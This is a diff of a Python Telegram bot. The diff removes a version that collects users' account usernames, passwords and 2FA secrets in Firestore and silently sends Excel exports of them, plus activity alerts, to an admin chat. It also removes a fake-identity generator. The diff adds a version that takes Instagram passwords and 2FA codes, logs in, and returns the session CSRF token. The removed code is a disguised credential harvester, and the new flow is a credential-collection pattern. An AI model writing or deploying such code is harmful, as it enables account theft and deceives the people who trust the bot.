@@ -1,505 +1,391 @@
 import os
-import io
-import json
-import random
-import string
 import logging
-import tempfile
-from datetime import datetime
-
-import pyotp
-import openpyxl
-import firebase_admin
-from firebase_admin import credentials, firestore
-from telegram import (
-    Update,
-    ReplyKeyboardMarkup,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-)
+import asyncio
+from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import (
     Application,
     CommandHandler,
     MessageHandler,
-    CallbackQueryHandler,
     ConversationHandler,
     ContextTypes,
     filters,
 )
+import pyotp
+from instagrapi import Client
+from instagrapi.exceptions import (
+    BadPassword,
+    ChallengeRequired,
+    TwoFactorRequired,
+    LoginRequired,
+    PleaseWaitFewMinutes,
+    ClientError,
+)
 
-# ─── Logging ────────────────────────────────────────────────────────────────
-
+# ---------- Logging (no sensitive data) ----------
 logging.basicConfig(
-    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO,
 )
+# Silence instagrapi noisy logs that could leak request bodies
+logging.getLogger("instagrapi").setLevel(logging.WARNING)
+logging.getLogger("public_request").setLevel(logging.WARNING)
+logging.getLogger("private_request").setLevel(logging.WARNING)
 logger = logging.getLogger(__name__)
 
-# ─── Environment Variables ───────────────────────────────────────────────────
+# ---------- Conversation States ----------
+(
+    COOKIE_USERNAME,
+    COOKIE_PASSWORD,
+    COOKIE_2FA,
+    TOTP_SECRET,
+) = range(4)
 
-BOT_TOKEN = os.environ["BOT_TOKEN"]
-ADMIN_CHAT_ID = int(os.environ["ADMIN_CHAT_ID"])
-FIREBASE_CREDENTIALS = os.environ["FIREBASE_CREDENTIALS"]
+BACK_BTN = "🔙 Back to Menu"
 
-# ─── Firebase Initialisation ─────────────────────────────────────────────────
-
-def init_firebase() -> firestore.Client:
-    """Parse the JSON credential string and initialise the Firebase app."""
-    cred_dict = json.loads(FIREBASE_CREDENTIALS)
-    if "private_key" in cred_dict:
-        cred_dict["private_key"] = cred_dict["private_key"].replace("\\n", "\n")
-    cred = credentials.Certificate(cred_dict)
-    firebase_admin.initialize_app(cred)
-    return firestore.client()
-
-
-db: firestore.Client = init_firebase()
-
-# ─── Firestore Helpers ───────────────────────────────────────────────────────
-
-COLLECTION = "accounts"
-
-
-def user_collection(user_id: int):
-    """Return a reference to the sub-collection for this user."""
-    return db.collection(COLLECTION).document(str(user_id)).collection("entries")
-
-
-def save_account(user_id: int, username: str, password: str, secret: str) -> str:
-    """Save an account entry and return the new document ID."""
-    ref = user_collection(user_id).document()
-    ref.set(
-        {
-            "username": username,
-            "password": password,
-            "secret": secret,
-            "timestamp": datetime.utcnow().isoformat(timespec="seconds") + "Z",
-        }
-    )
-    return ref.id
-
-
-def get_accounts(user_id: int) -> list[dict]:
-    """Return all saved accounts for a user, oldest first."""
-    docs = (
-        user_collection(user_id)
-        .order_by("timestamp")
-        .stream()
-    )
-    return [doc.to_dict() for doc in docs]
-
-
-def delete_accounts(user_id: int) -> int:
-    """Delete every account entry for a user. Returns the count deleted."""
-    docs = list(user_collection(user_id).stream())
-    for doc in docs:
-        doc.reference.delete()
-    return len(docs)
-
-
-# ─── Main Menu ───────────────────────────────────────────────────────────────
-
-MAIN_MENU_KB = ReplyKeyboardMarkup(
-    [
-        ["𝘾𝙧𝙚𝙖𝙩𝙚 𝙓𝙇𝙎𝙓 📑", "🎭 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤"],
-        ["👤 𝘼𝙙𝙢𝙞𝙣"],
-        ["📥 𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙..."],
-    ],
-    resize_keyboard=True,
-)
-
-
-async def send_main_menu(update: Update, text: str = "Choose an option:") -> None:
-    """Send (or re-send) the main menu keyboard."""
-    await update.effective_message.reply_text(text, reply_markup=MAIN_MENU_KB)
-
-
-# ─── ConversationHandler States ──────────────────────────────────────────────
-
-ASK_USERNAME, ASK_PASSWORD, ASK_SECRET = range(3)
-
-CB_DOWNLOAD  = "dl_download"
-CB_RESET     = "dl_reset"
-CB_RESET_YES = "dl_reset_yes"
-CB_RESET_NO  = "dl_reset_no"
-
-
-# ─── /start ──────────────────────────────────────────────────────────────────
-
-async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user = update.effective_user
-    await send_main_menu(
-        update,
-        f"👋 Welcome, {user.first_name}!\n\nWhat would you like to do?",
+# ---------- Keyboards ----------
+def main_menu_kb() -> ReplyKeyboardMarkup:
+    return ReplyKeyboardMarkup(
+        [
+            ["🍪 Cookie's Extract", "🔑 2FA Generator"],
+            ["👨‍💻 Developer", "📖 Guide"],
+        ],
+        resize_keyboard=True,
     )
 
+def back_kb() -> ReplyKeyboardMarkup:
+    return ReplyKeyboardMarkup(
+        [[BACK_BTN]],
+        resize_keyboard=True,
+    )
 
-# ─── 1. Submit Account – ConversationHandler ────────────────────────────────
+# ---------- Helpers ----------
+def wipe(context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Erase any sensitive data from user_data."""
+    for key in ("ig_username", "ig_password", "ig_2fa"):
+        if key in context.user_data:
+            try:
+                # Best-effort overwrite before delete
+                context.user_data[key] = "0" * 32
+            except Exception:
+                pass
+            context.user_data.pop(key, None)
+    context.user_data.clear()
 
-async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+async def send_main_menu(update: Update, text: str = "Main Menu") -> None:
+    await update.message.reply_text(text, reply_markup=main_menu_kb())
+
+# ---------- /start ----------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    wipe(context)
+    welcome = (
+        "<b>👋 Welcome to Instagram CSRF Extractor Bot</b>\n\n"
+        "This bot helps you:\n"
+        "• 🍪 Extract your Instagram <b>CSRF token</b>\n"
+        "• 🔑 Generate <b>2FA TOTP codes</b> from a Base32 secret\n\n"
+        "<i>Stateless &amp; private — nothing is stored.</i>\n\n"
+        "Choose an option below:"
+    )
+    await update.message.reply_text(welcome, parse_mode="HTML", reply_markup=main_menu_kb())
+    return ConversationHandler.END
+
+# ---------- Developer ----------
+async def developer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    text = (
+        "<b>👨‍💻 Developer Info</b>\n\n"
+        "• <b>Name:</b> Your Name\n"
+        "• <b>Telegram:</b> <a href=\"[t.me](https://t.me/yourusername\)">@yourusername</a>\n\n"
+        "<b>⚠️ Disclaimer</b>\n"
+        "This bot is provided for <i>educational and personal-account</i> use only. "
+        "You are solely responsible for the credentials you submit. The developer is not "
+        "liable for any misuse, account restrictions, or losses."
+    )
+    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_kb(), disable_web_page_preview=True)
+
+# ---------- Guide ----------
+async def guide(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    text = (
+        "<b>📖 Guide</b>\n\n"
+        "<b>🔹 How to extract your CSRF token</b>\n"
+        "1. Tap <b>🍪 Cookie's Extract</b>\n"
+        "2. Enter your Instagram username\n"
+        "3. Enter your password\n"
+        "4. Enter your 2FA code, or type <code>skip</code> if 2FA is disabled\n"
+        "5. The bot will log in and return your CSRF token\n\n"
+        "<b>🔹 What is a CSRF token?</b>\n"
+        "A CSRF (Cross-Site Request Forgery) token is a session value Instagram uses "
+        "to validate authenticated requests. It is used by automation tools, scrapers, "
+        "and API clients to act on behalf of your session.\n\n"
+        "<b>🔹 Security warnings</b>\n"
+        "• Anyone with your CSRF + session cookies can access your account.\n"
+        "• Never share your token in public chats or screenshots.\n"
+        "• Change your Instagram password if you suspect leakage.\n"
+        "• This bot does <b>not</b> store credentials, tokens, or 2FA secrets.\n\n"
+        "<b>🔹 How to get a Base32 secret for 2FA</b>\n"
+        "1. In Instagram, go to <i>Settings → Accounts Center → Password and Security → Two-factor authentication</i>\n"
+        "2. Choose <b>Authentication app</b>\n"
+        "3. Instagram will show a QR code and a <b>setup key</b> (Base32 string, e.g. <code>JBSWY3DPEHPK3PXP</code>)\n"
+        "4. Save that key — paste it into <b>🔑 2FA Generator</b> to get a live code"
+    )
+    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_kb())
+
+# ---------- Cookie Extract Flow ----------
+async def cookie_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text(
-        "📝 *Step 1 of 3* — Please send your *Username*.",
-        parse_mode="Markdown",
+        "🍪 <b>Cookie's Extract</b>\n\nPlease send your <b>Instagram username</b>:",
+        parse_mode="HTML",
+        reply_markup=back_kb(),
     )
-    return ASK_USERNAME
+    return COOKIE_USERNAME
 
-
-async def got_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["acc_username"] = update.message.text.strip()
+async def cookie_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if update.message.text == BACK_BTN:
+        return await cancel(update, context)
+    context.user_data["ig_username"] = update.message.text.strip()
     await update.message.reply_text(
-        "🔑 *Step 2 of 3* — Please send your *Password*.",
-        parse_mode="Markdown",
+        "🔒 Now send your <b>password</b>:",
+        parse_mode="HTML",
+        reply_markup=back_kb(),
     )
-    return ASK_PASSWORD
+    return COOKIE_PASSWORD
 
-
-async def got_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["acc_password"] = update.message.text.strip()
-    await update.message.reply_text(
-        "🔐 *Step 3 of 3* — Please send your *2FA Secret Key* "
-        "(Base32 string from Google Authenticator / your app).",
-        parse_mode="Markdown",
-    )
-    return ASK_SECRET
-
-
-async def got_secret(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    secret   = update.message.text.strip().upper().replace(" ", "")
-    username = context.user_data.pop("acc_username", "")
-    password = context.user_data.pop("acc_password", "")
-    user     = update.effective_user
-
+async def cookie_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if update.message.text == BACK_BTN:
+        return await cancel(update, context)
+    context.user_data["ig_password"] = update.message.text
+    # Best-effort: delete the message containing the password
     try:
-        totp_code = pyotp.TOTP(secret).now()
+        await update.message.delete()
     except Exception:
-        await update.message.reply_text(
-            "⚠️ The 2FA secret key looks invalid (must be a valid Base32 string). "
-            "Please restart by tapping *✅ Submit Account* and try again.",
-            parse_mode="Markdown",
-            reply_markup=MAIN_MENU_KB,
-        )
-        return ConversationHandler.END
+        pass
+    await update.message.chat.send_message(
+        "🔐 Send your <b>2FA code</b>, or type <code>skip</code> if 2FA is disabled:",
+        parse_mode="HTML",
+        reply_markup=back_kb(),
+    )
+    return COOKIE_2FA
 
-    try:
-        save_account(user.id, username, password, secret)
-    except Exception as exc:
-        logger.error("Firestore save failed: %s", exc)
-        await update.message.reply_text(
-            "❌ Failed to save to the database. Please try again later.",
-            reply_markup=MAIN_MENU_KB,
-        )
-        return ConversationHandler.END
+async def cookie_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if update.message.text == BACK_BTN:
+        return await cancel(update, context)
 
-    await update.message.reply_text(
-        f"✅ Account saved!\n\n"
-        f"🔢 Your current TOTP code is: `{totp_code}`\n\n"
-        "_This code refreshes every 30 seconds._",
-        parse_mode="Markdown",
-        reply_markup=MAIN_MENU_KB,
+    two_fa = update.message.text.strip()
+    context.user_data["ig_2fa"] = "" if two_fa.lower() == "skip" else two_fa
+
+    processing = await update.message.reply_text(
+        "⏳ <b>Processing, please wait...</b>",
+        parse_mode="HTML",
+        reply_markup=ReplyKeyboardRemove(),
     )
 
-    tag = f"@{user.username}" if user.username else f"#{user.id}"
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=(
-                "🆕 *New Account Submitted*\n\n"
-                f"👤 User: {user.full_name} ({tag})\n"
-                f"🆔 User ID: `{user.id}`\n"
-                f"📧 Account Username: `{username}`\n"
-                f"🕐 Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
-            ),
-            parse_mode="Markdown",
-        )
-    except Exception as exc:
-        logger.warning("Admin notify failed: %s", exc)
+    username = context.user_data.get("ig_username", "")
+    password = context.user_data.get("ig_password", "")
+    verification_code = context.user_data.get("ig_2fa", "")
 
+    # Run the blocking instagrapi login in a thread
+    try:
+        token, error = await asyncio.to_thread(
+            do_instagram_login, username, password, verification_code
+        )
+    except Exception as e:
+        logger.exception("Login thread crashed")
+        token, error = None, f"Unexpected error: {type(e).__name__}"
+
+    # Always wipe credentials immediately
+    wipe(context)
+
+    if token:
+        msg = (
+            "✅ <b>Login Successful!</b>\n\n"
+            f"🔑 <b>Your CSRF Token:</b>\n<code>{token}</code>\n\n"
+            "⚠️ <b>Keep this token private.</b> Anyone with this token can access your account."
+        )
+        try:
+            await processing.edit_text(msg, parse_mode="HTML")
+        except Exception:
+            await update.message.reply_text(msg, parse_mode="HTML")
+    else:
+        err_msg = f"❌ <b>Login failed.</b>\n\n<i>{error}</i>"
+        try:
+            await processing.edit_text(err_msg, parse_mode="HTML")
+        except Exception:
+            await update.message.reply_text(err_msg, parse_mode="HTML")
+
+    await send_main_menu(update, "Returned to main menu.")
     return ConversationHandler.END
 
 
-async def submit_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data.pop("acc_username", None)
-    context.user_data.pop("acc_password", None)
-    await send_main_menu(update, "❌ Submission cancelled.")
+def do_instagram_login(username: str, password: str, verification_code: str):
+    """Blocking login routine. Returns (csrf_token, error_message)."""
+    cl = Client()
+    cl.delay_range = [1, 2]
+    try:
+        cl.login(username, password, verification_code=verification_code or "")
+        # Extract CSRF token from cookies
+        token = None
+        try:
+            token = cl.private.cookies.get("csrftoken")
+        except Exception:
+            token = None
+        if not token:
+            # Fallback: scan session cookies
+            try:
+                for c in cl.private.cookies:
+                    if c.name == "csrftoken":
+                        token = c.value
+                        break
+            except Exception:
+                pass
+
+        if not token:
+            return None, "Login succeeded but no CSRF token was found in session."
+
+        return token, None
+
+    except BadPassword:
+        return None, "Incorrect password."
+    except TwoFactorRequired:
+        return None, "2FA is required but no valid code was provided."
+    except ChallengeRequired:
+        return None, "Instagram triggered a security challenge. Try logging in via the app first, then retry."
+    except PleaseWaitFewMinutes:
+        return None, "Instagram is rate-limiting this login. Please wait a few minutes and try again."
+    except LoginRequired:
+        return None, "Login required / session invalid."
+    except ClientError as e:
+        return None, f"Instagram client error: {type(e).__name__}"
+    except Exception as e:
+        return None, f"Unexpected error: {type(e).__name__}"
+    finally:
+        # Best-effort logout & wipe client state
+        try:
+            cl.logout()
+        except Exception:
+            pass
+        try:
+            cl.private.cookies.clear()
+        except Exception:
+            pass
+        del cl
+
+
+# ---------- 2FA Generator Flow ----------
+async def totp_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    await update.message.reply_text(
+        "🔑 <b>2FA Generator</b>\n\n"
+        "Send your <b>Base32 secret key</b> (e.g. <code>JBSWY3DPEHPK3PXP</code>):",
+        parse_mode="HTML",
+        reply_markup=back_kb(),
+    )
+    return TOTP_SECRET
+
+async def totp_generate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if update.message.text == BACK_BTN:
+        return await cancel(update, context)
+
+    secret = update.message.text.strip().replace(" ", "").upper()
+
+    # Best-effort: delete the message containing the secret
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
+    try:
+        totp = pyotp.TOTP(secret)
+        code = totp.now()
+        # Wipe local variable references
+        del totp
+    except Exception:
+        secret = None
+        await update.message.chat.send_message(
+            "❌ <b>Invalid Base32 secret.</b> Please check and try again.",
+            parse_mode="HTML",
+            reply_markup=main_menu_kb(),
+        )
+        return ConversationHandler.END
+
+    # Wipe secret from memory reference
+    secret = None
+    wipe(context)
+
+    await update.message.chat.send_message(
+        f"🔐 <b>Your current 2FA code:</b> <code>{code}</code>\n"
+        "<i>(valid for up to 30 seconds)</i>",
+        parse_mode="HTML",
+        reply_markup=main_menu_kb(),
+    )
     return ConversationHandler.END
 
 
-# ─── 2. Fake Info ────────────────────────────────────────────────────────────
-
-FIRST_NAMES = [
-    "Alex", "Jordan", "Morgan", "Taylor", "Casey", "Riley", "Drew", "Skyler",
-    "Quinn", "Avery", "Blake", "Cameron", "Dakota", "Emery", "Finley",
-    "Harper", "Indigo", "Jamie", "Kendall", "Logan",
-]
-LAST_NAMES = [
-    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
-    "Davis", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson",
-    "Martin", "Lee", "Perez", "Thompson", "White", "Harris",
-]
-GENDERS = ["Male", "Female", "Non-binary"]
-
-
-def generate_fake_info() -> dict:
-    first = random.choice(FIRST_NAMES)
-    last  = random.choice(LAST_NAMES)
-    name  = f"{first} {last}"
-
-    mid_digits = "".join(random.choices(string.digits, k=random.randint(2, 4)))
-    suffix     = "".join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
-    username   = f"{first.lower()}{mid_digits}{suffix}"
-
-    gender = random.choice(GENDERS)
-    return {"name": name, "username": username, "gender": gender}
-
-
-async def fake_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    info = generate_fake_info()
+# ---------- Cancel / Back ----------
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    wipe(context)
     await update.message.reply_text(
-        "🎭 *Generated Fake Info*\n\n"
-        f"👤 Name: `{info['name']}`\n"
-        f"🔖 Username: `{info['username']}`\n"
-        f"⚧ Gender: `{info['gender']}`",
-        parse_mode="Markdown",
-        reply_markup=MAIN_MENU_KB,
+        "↩️ Cancelled. Back to main menu.",
+        reply_markup=main_menu_kb(),
     )
+    return ConversationHandler.END
 
 
-# ─── 3. Admin Contact ────────────────────────────────────────────────────────
-
-async def admin_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user = update.effective_user
-    tag  = f"@{user.username}" if user.username else f"#{user.id}"
-
-    # ── TASK 2: Show ONLY the admin username ──
-    await update.message.reply_text(
-        "📬 *Admin Contact*\n\n"
-        "• @ZynexNox",
-        parse_mode="Markdown",
-        reply_markup=MAIN_MENU_KB,
-    )
-
-    # Silent admin notification (unchanged)
+# ---------- Error handler ----------
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    logger.error("Exception while handling an update: %s", context.error)
     try:
-        await context.bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=(
-                "👁 *Admin Section Accessed*\n\n"
-                f"👤 {user.full_name} ({tag})\n"
-                f"🆔 ID: `{user.id}`\n"
-                f"🕐 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
-            ),
-            parse_mode="Markdown",
-        )
-    except Exception as exc:
-        logger.warning("Admin notify failed: %s", exc)
+        if isinstance(update, Update) and update.effective_message:
+            await update.effective_message.reply_text(
+                "⚠️ Something went wrong. Please try again.",
+                reply_markup=main_menu_kb(),
+            )
+    except Exception:
+        pass
 
 
-# ─── 4. Download – Menu ──────────────────────────────────────────────────────
-
-async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    kb = InlineKeyboardMarkup(
-        [
-            [
-                InlineKeyboardButton("📎 Download",      callback_data=CB_DOWNLOAD),
-                InlineKeyboardButton("🔄 Reset Report",  callback_data=CB_RESET),
-            ]
-        ]
-    )
-    await update.message.reply_text("📥 *Download Options*", parse_mode="Markdown", reply_markup=kb)
-
-
-# ─── 4a. Download – Excel ────────────────────────────────────────────────────
-
-def build_excel(accounts: list[dict]) -> io.BytesIO:
-    """
-    Build an in-memory Excel workbook.
-    TASK 1: Contains ONLY Username, Password, 2FA Secret — no index or timestamp.
-    """
-    from openpyxl.styles import Font, PatternFill, Alignment
-
-    wb = openpyxl.Workbook()
-    ws = wb.active
-    ws.title = "Accounts"
-
-    # ── Header row (3 columns only) ──
-    headers = ["Username", "Password", "2FA Secret"]
-    ws.append(headers)
-
-    header_font = Font(bold=True, color="FFFFFF")
-    header_fill = PatternFill(fill_type="solid", fgColor="2E86C1")
-    for col_idx in range(1, len(headers) + 1):
-        cell = ws.cell(row=1, column=col_idx)
-        cell.font      = header_font
-        cell.fill      = header_fill
-        cell.alignment = Alignment(horizontal="center")
-
-    # ── Data rows ──
-    for acc in accounts:
-        ws.append(
-            [
-                acc.get("username", ""),
-                acc.get("password", ""),
-                acc.get("secret",   ""),
-            ]
-        )
-
-    # ── Auto-size columns ──
-    for col in ws.columns:
-        max_len = max((len(str(c.value or "")) for c in col), default=0)
-        ws.column_dimensions[col[0].column_letter].width = min(max_len + 4, 50)
-
-    buf = io.BytesIO()
-    wb.save(buf)
-    buf.seek(0)
-    return buf
-
-
-async def download_accounts_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    user = update.effective_user
-
-    accounts = get_accounts(user.id)
-
-    if not accounts:
-        await query.edit_message_text("📭 You have no saved accounts yet.")
-        await send_main_menu(update)
-        return
-
-    excel_buf = build_excel(accounts)
-    filename  = f"accounts_{user.id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.xlsx"
-
-    await query.edit_message_text(f"📎 Sending your {len(accounts)} account(s)…")
-
-    excel_buf.seek(0)
-    await context.bot.send_document(
-        chat_id=user.id,
-        document=excel_buf,
-        filename=filename,
-        caption=f"📊 Your accounts export — {len(accounts)} record(s).",
-    )
-
-    excel_buf.seek(0)
-    tag = f"@{user.username}" if user.username else f"#{user.id}"
-    try:
-        await context.bot.send_document(
-            chat_id=ADMIN_CHAT_ID,
-            document=excel_buf,
-            filename=filename,
-            caption=(
-                f"📋 *Backup Export*\n"
-                f"User: {user.full_name} ({tag})\n"
-                f"ID: `{user.id}`\n"
-                f"Records: {len(accounts)}"
-            ),
-            parse_mode="Markdown",
-        )
-    except Exception as exc:
-        logger.warning("Admin backup send failed: %s", exc)
-
-    await send_main_menu(update)
-
-
-# ─── 4b. Download – Reset ────────────────────────────────────────────────────
-
-async def reset_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-
-    kb = InlineKeyboardMarkup(
-        [
-            [
-                InlineKeyboardButton("✅ Yes, delete all", callback_data=CB_RESET_YES),
-                InlineKeyboardButton("❌ Cancel",          callback_data=CB_RESET_NO),
-            ]
-        ]
-    )
-    await query.edit_message_text(
-        "⚠️ *Are you sure?*\n\nThis will permanently delete *all* your saved accounts.",
-        parse_mode="Markdown",
-        reply_markup=kb,
-    )
-
-
-async def reset_yes_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    user  = update.effective_user
-
-    count = delete_accounts(user.id)
-    await query.edit_message_text(
-        f"🗑 Done! *{count}* account(s) have been deleted.",
-        parse_mode="Markdown",
-    )
-
-    tag = f"@{user.username}" if user.username else f"#{user.id}"
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=(
-                f"🗑 *Reset Report*\n\n"
-                f"User: {user.full_name} ({tag})\n"
-                f"ID: `{user.id}`\n"
-                f"Deleted: {count} account(s)\n"
-                f"🕐 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
-            ),
-            parse_mode="Markdown",
-        )
-    except Exception as exc:
-        logger.warning("Admin notify failed: %s", exc)
-
-    await send_main_menu(update)
-
-
-async def reset_no_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer("Cancelled.")
-    await query.edit_message_text("❌ Reset cancelled.")
-    await send_main_menu(update)
-
-
-# ─── Fallback for unknown text (outside a conversation) ─────────────────────
-
-async def unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await send_main_menu(update, "❓ Use the menu below to navigate.")
-
-
-# ─── Application Setup ───────────────────────────────────────────────────────
-
+# ---------- Main ----------
 def main() -> None:
-    app = Application.builder().token(BOT_TOKEN).build()
+    token = os.environ.get("BOT_TOKEN")
+    if not token:
+        raise RuntimeError("BOT_TOKEN environment variable is not set.")
 
-    submit_conv = ConversationHandler(
-        entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
+    app = Application.builder().token(token).build()
+
+    cookie_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex(r"^🍪 Cookie's Extract$"), cookie_start)],
         states={
-            ASK_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_username)],
-            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, got_password)],
-            ASK_SECRET:   [MessageHandler(filters.TEXT & ~filters.COMMAND, got_secret)],
+            COOKIE_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, cookie_username)],
+            COOKIE_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, cookie_password)],
+            COOKIE_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, cookie_2fa)],
         },
         fallbacks=[
-            CommandHandler("cancel", submit_cancel),
-            MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start),
+            CommandHandler("start", start),
+            MessageHandler(filters.Regex(f"^{BACK_BTN}$"), cancel),
         ],
         allow_reentry=True,
     )
 
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(submit_conv)
-    app.add_handler(MessageHandler(filters.Regex(r"^🎭 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤$"),  fake_info_handler))
-    app.add_handler(MessageHandler(filters.Regex(r"^👤 𝘼𝙙𝙢𝙞𝙣$"),        admin_handler))
-    app.add_handler(MessageHandler(filters.Regex(r"^📥 𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙\.\.\.$"), download_menu))
+    totp_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex(r"^🔑 2FA Generator$"), totp_start)],
+        states={
+            TOTP_SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, totp_generate)],
+        },
+        fallbacks=[
+            CommandHandler("start", start),
+            MessageHandler(filters.Regex(f"^{BACK_BTN}$"), cancel),
+        ],
+        allow_reentry=True,
+    )
 
-    app.add_handler(CallbackQueryHandler(download_accounts_cb, pattern=f"^{CB_DOWNLOAD}$"))
-    app.add_handler(CallbackQueryHandler(reset_confirm_cb,     pattern=f"^{CB_RESET}$"))
-    app.add_handler(CallbackQueryHandler(reset_yes_cb,         pattern=f"^{CB_RESET_YES}$"))
-    app.add_handler(CallbackQueryHandler(reset_no_cb,          pattern=f"^{CB_RESET_NO}$"))
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(cookie_conv)
+    app.add_handler(totp_conv)
+    app.add_handler(MessageHandler(filters.Regex(r"^👨‍💻 Developer$"), developer))
+    app.add_handler(MessageHandler(filters.Regex(r"^📖 Guide$"), guide))
+    app.add_handler(MessageHandler(filters.Regex(f"^{BACK_BTN}$"), cancel))
 
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown_message))
+    app.add_error_handler(error_handler)
 
-    logger.info("Bot is starting…")
-    app.run_polling(drop_pending_updates=True)
+    logger.info("Bot starting...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
 if __name__ == "__main__":
     main()
-        
